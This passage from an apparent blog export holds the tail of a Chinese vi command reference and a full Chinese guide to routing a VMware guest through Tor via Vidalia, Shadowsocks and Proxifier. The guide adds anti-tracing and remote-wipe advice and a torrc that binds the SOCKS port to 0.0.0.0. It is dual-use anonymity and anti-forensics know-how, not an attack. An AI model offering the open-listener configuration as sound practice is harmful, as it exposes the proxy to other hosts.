：在当前行首</p>\n<p>a：光标后</p>\n<p>A：在当前行尾</p>\n<p>o：在当前行之下新开一行</p>\n<p>O：在当前行之上新开一行</p>\n<p>r：替换当前字符</p>\n<p>R：替换当前字符及其后的字符，直至按ESC键</p>\n<p>s：从当前光标位置处开始，以输入的文本替代指定数目的字符</p>\n<p>S：删除指定数目的行，并以所输入文本代替之</p>\n<p>ncw或nCW：修改指定数目的字</p>\n<p>nCC：修改指定数目的行</p>\n<h2 id=\"删除命令\"><a href=\"#删除命令\" class=\"headerlink\" title=\"删除命令\"></a>删除命令</h2><p>ndw或ndW：删除光标处开始及其后的n-1个字</p>\n<p>do：删至行首</p>\n<p>d$：删至行尾</p>\n<p>ndd：删除当前行及其后n-1行</p>\n<p>x或X：删除一个字符，x删除光标后的，而X删除光标前的</p>\n<p>Ctrl+u：删除输入方式下所输入的文本</p>\n<h2 id=\"搜索及替换命令\"><a href=\"#搜索及替换命令\" class=\"headerlink\" title=\"搜索及替换命令\"></a>搜索及替换命令</h2><p>/pattern：从光标开始处向文件尾搜索pattern</p>\n<p>?pattern：从光标开始处向文件首搜索pattern</p>\n<p>n：在同一方向重复上一次搜索命令</p>\n<p>N：在反方向上重复上一次搜索命令</p>\n<p>：s/p1/p2/g：将当前行中所有p1均用p2替代</p>\n<p>：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代</p>\n<p>：g/p1/s//p2/g：将文件中所有p1均用p2替换</p>\n<h2 id=\"选项设置\"><a href=\"#选项设置\" class=\"headerlink\" title=\"选项设置\"></a>选项设置</h2><p>all：列出所有选项设置情况</p>\n<p>term：设置终端类型</p>\n<p>ignorance：在搜索中忽略大小写</p>\n<p>list：显示制表位(Ctrl+I)和行尾标志（$)</p>\n<p>number：显示行号</p>\n<p>report：显示由面向行的命令修改过的数目</p>\n<p>terse：显示简短的警告信息</p>\n<p>warn：在转到别的文件时若没保存当前文件则显示NO write信息</p>\n<p>nomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符</p>\n<p>nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始</p>\n<p>mesg：允许vi显示其他用户用write写到自己终端上的信息</p>\n<h2 id=\"最后行方式命令\"><a href=\"#最后行方式命令\" class=\"headerlink\" title=\"最后行方式命令\"></a>最后行方式命令</h2><p>：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下</p>\n<p>：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下</p>\n<p>：n1,n2 d ：将n1行到n2行之间的内容删除</p>\n<p>：w ：保存当前文件</p>\n<p>：e filename：打开文件filename进行编辑</p>\n<p>：x：保存当前文件并退出</p>\n<p>：q：退出vi</p>\n<p>：q!：不保存文件并退出vi</p>\n<p>：!command：执行shell命令command</p>\n<p>：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入</p>\n<p>：r!command：将命令command的输出结果放到当前行</p>\n<h2 id=\"寄存器操作\"><a href=\"#寄存器操作\" class=\"headerlink\" title=\"寄存器操作\"></a>寄存器操作</h2><p>“?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字</p>\n<p>ndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。</p>"},{"title":"Tor安全上网指南","id":"4","updated":"2016-08-05T20:13:45.000Z","date":"2016-07-28T15:01:47.000Z","_content":"\n\n本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。\n<!-- more --> \n声明！\n\n==本文原创，技术无罪，笔者即将身处海外，本文撰写目的**仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途**。==\n\n==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，**不允许任何形式私自转载**，本文只进行对TOR相关**技术探讨**，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==\n\n\n**准备条件**\n\n* 1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。\n\n* 2.最新版Vidalia [下载地址](https://dist.torproject.org/vidalia-bundles/)（需完整互联网）\n\n* 3.Vmware Fusion/Vmware workstation/Oracle VirtualBox\n\n* 4.一个完整版的虚拟机操作系统\n\n**笔者环境**\n\n操作系统：OS X EI Capitan 10.11.5\n\n虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)\n\n虚拟机操作系统：Windows xp sp2 或 Kali linux\n\n隧道软件：lantern 或 shadowsockets\n\n### Vidalia部分\n\n*如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。*\n<img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/>\n**1.建立您的隧道网络**\n\n笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。\n\n**2.在Vidalia中设置代理连接**\n\n打开Vidalia-设置-网络：我使用代理服务器连接网络\n\n地址：127.0.0.1 端口：1080（用户定义）\n\n类型：SOCKS 5\n![](/content/images/2016/07/1-2.png)\n\n**3.继续设置，转发出外网端口**\n\nVidalia-设置-高级-编辑当前torrc：\n![](/content/images/2016/07/1-3.png)\n确认socksport为9050，也可以定义为其他端口。\n同时添加`SocksListenAddress 0.0.0.0:9050`到底部\n保存\n\n笔者配置文件如下，仅供参考，不可复制：\n\n```Bash\n# This file was generated by Tor; if you edit it, comments will not be preserved\n# The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it\n\nControlPort 9051\nDataDirectory /Users/ivan/.tor\nDirReqStatistics 0\nHashedControlPassword 16:此处隐藏\nSocks5Proxy 127.0.0.1:1080\nLog notice stdout\nSocksListenAddress 0.0.0.0:9050\nSocksPort 9050\n```\n\n\n</pre>\n![](/content/images/2016/07/1-4.png)\n**4.Vidalia启动TOR**\n\n稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。\n![](/content/images/2016/07/1-5.png)\n随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。\n![](/content/images/2016/07/2-2.png)\n![](/content/images/2016/07/2-1.png)\n\n### Vmware部分\n\n**1.设置Vmware，添加虚拟网卡**\n\n进入Vmware的偏好设置-网络，先点小锁，把功能解锁。\n\n然后点+，新建一个网络，**警告：请勿勾选NAT**。\n\n**勾选 将MAC主机连入该网络**\n\n同时设置 **通过DHCP在该网络提供网络地址**：\n\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n![](/content/images/2016/07/1.jpg)\n**2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2**\n\n虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。\n![](/content/images/2016/07/2.jpg)\n\n### **虚拟机部分(Win)**\n**1.进入操作系统**\n\n建议重新安装操作系统，以保证系统纯净性。\n![](/content/images/2016/07/4-1.jpg)\n![](/content/images/2016/07/5-pic_hd.jpg)\n\n**2.寻找宿主机ip**\n\n经过笔者的简单测试，宿主机ip为172.16.225.1\n![](/content/images/2016/07/6-pic_hd.jpg)\n如果实在找不到，可用啊D工具箱或nmap等工具进行查找。\n\n**3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接**\n\n**4.安装Proxifier**\n\nProxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。\n\n**5.配置Proxifer**\n\n打开Proxifier-Profile-Proxy Servers，点击Add...\n![](/content/images/2016/07/7-pic_hd.jpg)\n\n随后保存并设置而为默认\n\n**6.测试网络**\n\n打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。\n![](/content/images/2016/07/9-pic_hd.jpg)\n![](/content/images/2016/07/8-pic_hd.jpg)\n\n### **总结**\n\n为了保证用户隐私的绝对安全，建议做到以下几点：\n\n* 在虚拟机系统下不要留下任何痕迹：\n * 虚拟机操作系统系统语言设置为英语，地区为美国。\n * 虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。\n * 关机前清除系统隐私记录，养成良好习惯。\n * 能设置不保留记录的软件均设置如此。\n * 不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。\n * 不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。\n* 将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。\n* 设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。\n* 进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。\n\n**特别鸣谢**\n\n感谢几年前@safe121提供的无私技术帮助\n\n","source":"_posts/Tor安全上网指南.md","raw":"---\ntitle: Tor安全上网指南\ntags: 'Hack'\npermalink: tor\nid: 4\nupdated: '2016-08-05 21:13:45'\ndate: 2016-07-28 16:01:47\n---\n\n\n本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。\n<!-- more --> \n声明！\n\n==本文原创，技术无罪，笔者即将身处海外，本文撰写目的**仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途**。==\n\n==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，**不允许任何形式私自转载**，本文只进行对TOR相关**技术探讨**，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==\n\n\n**准备条件**\n\n* 1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。\n\n* 2.最新版Vidalia [下载地址](https://dist.torproject.org/vidalia-bundles/)（需完整互联网）\n\n* 3.Vmware Fusion/Vmware workstation/Oracle VirtualBox\n\n* 4.一个完整版的虚拟机操作系统\n\n**笔者环境**\n\n操作系统：OS X EI Capitan 10.11.5\n\n虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)\n\n虚拟机操作系统：Windows xp sp2 或 Kali linux\n\n隧道软件：lantern 或 shadowsockets\n\n### Vidalia部分\n\n*如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。*\n<img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/>\n**1.建立您的隧道网络**\n\n笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。\n\n**2.在Vidalia中设置代理连接**\n\n打开Vidalia-设置-网络：我使用代理服务器连接网络\n\n地址：127.0.0.1 端口：1080（用户定义）\n\n类型：SOCKS 5\n![](/content/images/2016/07/1-2.png)\n\n**3.继续设置，转发出外网端口**\n\nVidalia-设置-高级-编辑当前torrc：\n![](/content/images/2016/07/1-3.png)\n确认socksport为9050，也可以定义为其他端口。\n同时添加`SocksListenAddress 0.0.0.0:9050`到底部\n保存\n\n笔者配置文件如下，仅供参考，不可复制：\n\n```Bash\n# This file was generated by Tor; if you edit it, comments will not be preserved\n# The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it\n\nControlPort 9051\nDataDirectory /Users/ivan/.tor\nDirReqStatistics 0\nHashedControlPassword 16:此处隐藏\nSocks5Proxy 127.0.0.1:1080\nLog notice stdout\nSocksListenAddress 0.0.0.0:9050\nSocksPort 9050\n```\n\n\n</pre>\n![](/content/images/2016/07/1-4.png)\n**4.Vidalia启动TOR**\n\n稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。\n![](/content/images/2016/07/1-5.png)\n随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。\n![](/content/images/2016/07/2-2.png)\n![](/content/images/2016/07/2-1.png)\n\n### Vmware部分\n\n**1.设置Vmware，添加虚拟网卡**\n\n进入Vmware的偏好设置-网络，先点小锁，把功能解锁。\n\n然后点+，新建一个网络，**警告：请勿勾选NAT**。\n\n**勾选 将MAC主机连入该网络**\n\n同时设置 **通过DHCP在该网络提供网络地址**：\n\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n![](/content/images/2016/07/1.jpg)\n**2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2**\n\n虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。\n![](/content/images/2016/07/2.jpg)\n\n### **虚拟机部分(Win)**\n**1.进入操作系统**\n\n建议重新安装操作系统，以保证系统纯净性。\n![](/content/images/2016/07/4-1.jpg)\n![](/content/images/2016/07/5-pic_hd.jpg)\n\n**2.寻找宿主机ip**\n\n经过笔者的简单测试，宿主机ip为172.16.225.1\n![](/content/images/2016/07/6-pic_hd.jpg)\n如果实在找不到，可用啊D工具箱或nmap等工具进行查找。\n\n**3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接**\n\n**4.安装Proxifier**\n\nProxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。\n\n**5.配置Proxifer**\n\n打开Proxifier-Profile-Proxy Servers，点击Add...\n![](/content/images/2016/07/7-pic_hd.jpg)\n\n随后保存并设置而为默认\n\n**6.测试网络**\n\n打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。\n![](/content/images/2016/07/9-pic_hd.jpg)\n![](/content/images/2016/07/8-pic_hd.jpg)\n\n### **总结**\n\n为了保证用户隐私的绝对安全，建议做到以下几点：\n\n* 在虚拟机系统下不要留下任何痕迹：\n * 虚拟机操作系统系统语言设置为英语，地区为美国。\n * 虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。\n * 关机前清除系统隐私记录，养成良好习惯。\n * 能设置不保留记录的软件均设置如此。\n * 不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。\n * 不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。\n* 将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。\n* 设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。\n* 进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。\n\n**特别鸣谢**\n\n感谢几年前@safe121提供的无私技术帮助\n\n","slug":"tor","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiska7000r3son4kjo1c7d","content":"<p>本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。<br><a id=\"more\"></a><br>声明！</p>\n<p>==本文原创，技术无罪，笔者即将身处海外，本文撰写目的<strong>仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途</strong>。==</p>\n<p>==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，<strong>不允许任何形式私自转载</strong>，本文只进行对TOR相关<strong>技术探讨</strong>，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==</p>\n<p><strong>准备条件</strong></p>\n<ul>\n<li><p>1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。</p>\n</li>\n<li><p>2.最新版Vidalia <a href=\"https://dist.torproject.org/vidalia-bundles/\" target=\"_blank\" rel=\"external\">下载地址</a>（需完整互联网）</p>\n</li>\n<li><p>3.Vmware Fusion/Vmware workstation/Oracle VirtualBox</p>\n</li>\n<li><p>4.一个完整版的虚拟机操作系统</p>\n</li>\n</ul>\n<p><strong>笔者环境</strong></p>\n<p>操作系统：OS X EI Capitan 10.11.5</p>\n<p>虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)</p>\n<p>虚拟机操作系统：Windows xp sp2 或 Kali linux</p>\n<p>隧道软件：lantern 或 shadowsockets</p>\n<h3 id=\"Vidalia部分\"><a href=\"#Vidalia部分\" class=\"headerlink\" title=\"Vidalia部分\"></a>Vidalia部分</h3><p><em>如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。</em><br><img src=\"/content/images/2016/07/1-1.png\" width=\"500px\"><br><strong>1.建立您的隧道网络</strong></p>\n<p>笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。</p>\n<p><strong>2.在Vidalia中设置代理连接</strong></p>\n<p>打开Vidalia-设置-网络：我使用代理服务器连接网络</p>\n<p>地址：127.0.0.1 端口：1080（用户定义）</p>\n<p>类型：SOCKS 5<br><img src=\"/content/images/2016/07/1-2.png\" alt=\"\"></p>\n<p><strong>3.继续设置，转发出外网端口</strong></p>\n<p>Vidalia-设置-高级-编辑当前torrc：<br><img src=\"/content/images/2016/07/1-3.png\" alt=\"\"><br>确认socksport为9050，也可以定义为其他端口。<br>同时添加<code>SocksListenAddress 0.0.0.0:9050</code>到底部<br>保存</p>\n<p>笔者配置文件如下，仅供参考，不可复制：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># This file was generated by Tor; if you edit it, comments will not be preserved</span></div><div class=\"line\"><span class=\"comment\"># The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it</span></div><div class=\"line\"></div><div class=\"line\">ControlPort 9051</div><div class=\"line\">DataDirectory /Users/ivan/.tor</div><div class=\"line\">DirReqStatistics 0</div><div class=\"line\">HashedControlPassword 16:此处隐藏</div><div class=\"line\">Socks5Proxy 127.0.0.1:1080</div><div class=\"line\">Log notice stdout</div><div class=\"line\">SocksListenAddress 0.0.0.0:9050</div><div class=\"line\">SocksPort 9050</div></pre></td></tr></table></figure>\n<p><br><img src=\"/content/images/2016/07/1-4.png\" alt=\"\"><br><strong>4.Vidalia启动TOR</strong></p>\n<p>稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。<br><img src=\"/content/images/2016/07/1-5.png\" alt=\"\"><br>随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。<br><img src=\"/content/images/2016/07/2-2.png\" alt=\"\"><br><img src=\"/content/images/2016/07/2-1.png\" alt=\"\"></p>\n<h3 id=\"Vmware部分\"><a href=\"#Vmware部分\" class=\"headerlink\" title=\"Vmware部分\"></a>Vmware部分</h3><p><strong>1.设置Vmware，添加虚拟网卡</strong></p>\n<p>进入Vmware的偏好设置-网络，先点小锁，把功能解锁。</p>\n<p>然后点+，新建一个网络，<strong>警告：请勿勾选NAT</strong>。</p>\n<p><strong>勾选 将MAC主机连入该网络</strong></p>\n<p>同时设置 <strong>通过DHCP在该网络提供网络地址</strong>：</p>\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n<p><img src=\"/content/images/2016/07/1.jpg\" alt=\"\"><br><strong>2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2</strong></p>\n<p>虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。<br><img src=\"/content/images/2016/07/2.jpg\" alt=\"\"></p>\n<h3 id=\"虚拟机部分-Win\"><a href=\"#虚拟机部分-Win\" class=\"headerlink\" title=\"虚拟机部分(Win)\"></a><strong>虚拟机部分(Win)</strong></h3><p><strong>1.进入操作系统</strong></p>\n<p>建议重新安装操作系统，以保证系统纯净性。<br><img src=\"/content/images/2016/07/4-1.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/5-pic_hd.jpg\" alt=\"\"></p>\n<p><strong>2.寻找宿主机ip</strong></p>\n<p>经过笔者的简单测试，宿主机ip为172.16.225.1<br><img src=\"/content/images/2016/07/6-pic_hd.jpg\" alt=\"\"><br>如果实在找不到，可用啊D工具箱或nmap等工具进行查找。</p>\n<p><strong>3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接</strong></p>\n<p><strong>4.安装Proxifier</strong></p>\n<p>Proxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。</p>\n<p><strong>5.配置Proxifer</strong></p>\n<p>打开Proxifier-Profile-Proxy Servers，点击Add…<br><img src=\"/content/images/2016/07/7-pic_hd.jpg\" alt=\"\"></p>\n<p>随后保存并设置而为默认</p>\n<p><strong>6.测试网络</strong></p>\n<p>打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。<br><img src=\"/content/images/2016/07/9-pic_hd.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/8-pic_hd.jpg\" alt=\"\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><strong>总结</strong></h3><p>为了保证用户隐私的绝对安全，建议做到以下几点：</p>\n<ul>\n<li>在虚拟机系统下不要留下任何痕迹：<ul>\n<li>虚拟机操作系统系统语言设置为英语，地区为美国。</li>\n<li>虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。</li>\n<li>关机前清除系统隐私记录，养成良好习惯。</li>\n<li>能设置不保留记录的软件均设置如此。</li>\n<li>不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。</li>\n<li>不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。</li>\n</ul>\n</li>\n<li>将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。</li>\n<li>设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。</li>\n<li>进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。</li>\n</ul>\n<p><strong>特别鸣谢</strong></p>\n<p>感谢几年前@safe121提供的无私技术帮助</p>\n","excerpt":"<p>本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。<br>","more":"<br>声明！</p>\n<p>==本文原创，技术无罪，笔者即将身处海外，本文撰写目的<strong>仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途</strong>。==</p>\n<p>==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，<strong>不允许任何形式私自转载</strong>，本文只进行对TOR相关<strong>技术探讨</strong>，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==</p>\n<p><strong>准备条件</strong></p>\n<ul>\n<li><p>1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。</p>\n</li>\n<li><p>2.最新版Vidalia <a href=\"https://dist.torproject.org/vidalia-bundles/\">下载地址</a>（需完整互联网）</p>\n</li>\n<li><p>3.Vmware Fusion/Vmware workstation/Oracle VirtualBox</p>\n</li>\n<li><p>4.一个完整版的虚拟机操作系统</p>\n</li>\n</ul>\n<p><strong>笔者环境</strong></p>\n<p>操作系统：OS X EI Capitan 10.11.5</p>\n<p>虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)</p>\n<p>虚拟机操作系统：Windows xp sp2 或 Kali linux</p>\n<p>隧道软件：lantern 或 shadowsockets</p>\n<h3 id=\"Vidalia部分\"><a href=\"#Vidalia部分\" class=\"headerlink\" title=\"Vidalia部分\"></a>Vidalia部分</h3><p><em>如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。</em><br><img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/><br><strong>1.建立您的隧道网络</strong></p>\n<p>笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。</p>\n<p><strong>2.在Vidalia中设置代理连接</strong></p>\n<p>打开Vidalia-设置-网络：我使用代理服务器连接网络</p>\n<p>地址：127.0.0.1 端口：1080（用户定义）</p>\n<p>类型：SOCKS 5<br><img src=\"/content/images/2016/07/1-2.png\" alt=\"\"></p>\n<p><strong>3.继续设置，转发出外网端口</strong></p>\n<p>Vidalia-设置-高级-编辑当前torrc：<br><img src=\"/content/images/2016/07/1-3.png\" alt=\"\"><br>确认socksport为9050，也可以定义为其他端口。<br>同时添加<code>SocksListenAddress 0.0.0.0:9050</code>到底部<br>保存</p>\n<p>笔者配置文件如下，仅供参考，不可复制：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># This file was generated by Tor; if you edit it, comments will not be preserved</span></div><div class=\"line\"><span class=\"comment\"># The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it</span></div><div class=\"line\"></div><div class=\"line\">ControlPort 9051</div><div class=\"line\">DataDirectory /Users/ivan/.tor</div><div class=\"line\">DirReqStatistics 0</div><div class=\"line\">HashedControlPassword 16:此处隐藏</div><div class=\"line\">Socks5Proxy 127.0.0.1:1080</div><div class=\"line\">Log notice stdout</div><div class=\"line\">SocksListenAddress 0.0.0.0:9050</div><div class=\"line\">SocksPort 9050</div></pre></td></tr></table></figure>\n<p></pre><br><img src=\"/content/images/2016/07/1-4.png\" alt=\"\"><br><strong>4.Vidalia启动TOR</strong></p>\n<p>稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。<br><img src=\"/content/images/2016/07/1-5.png\" alt=\"\"><br>随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。<br><img src=\"/content/images/2016/07/2-2.png\" alt=\"\"><br><img src=\"/content/images/2016/07/2-1.png\" alt=\"\"></p>\n<h3 id=\"Vmware部分\"><a href=\"#Vmware部分\" class=\"headerlink\" title=\"Vmware部分\"></a>Vmware部分</h3><p><strong>1.设置Vmware，添加虚拟网卡</strong></p>\n<p>进入Vmware的偏好设置-网络，先点小锁，把功能解锁。</p>\n<p>然后点+，新建一个网络，<strong>警告：请勿勾选NAT</strong>。</p>\n<p><strong>勾选 将MAC主机连入该网络</strong></p>\n<p>同时设置 <strong>通过DHCP在该网络提供网络地址</strong>：</p>\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n<p><img src=\"/content/images/2016/07/1.jpg\" alt=\"\"><br><strong>2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2</strong></p>\n<p>虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。<br><img src=\"/content/images/2016/07/2.jpg\" alt=\"\"></p>\n<h3 id=\"虚拟机部分-Win\"><a href=\"#虚拟机部分-Win\" class=\"headerlink\" title=\"虚拟机部分(Win)\"></a><strong>虚拟机部分(Win)</strong></h3><p><strong>1.进入操作系统</strong></p>\n<p>建议重新安装操作系统，以保证系统纯净性。<br><img src=\"/content/images/2016/07/4-1.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/5-pic_hd.jpg\" alt=\"\"></p>\n<p><strong>2.寻找宿主机ip</strong></p>\n<p>经过笔者的简单测试，宿主机ip为172.16.225.1<br><img src=\"/content/images/2016/07/6-pic_hd.jpg\" 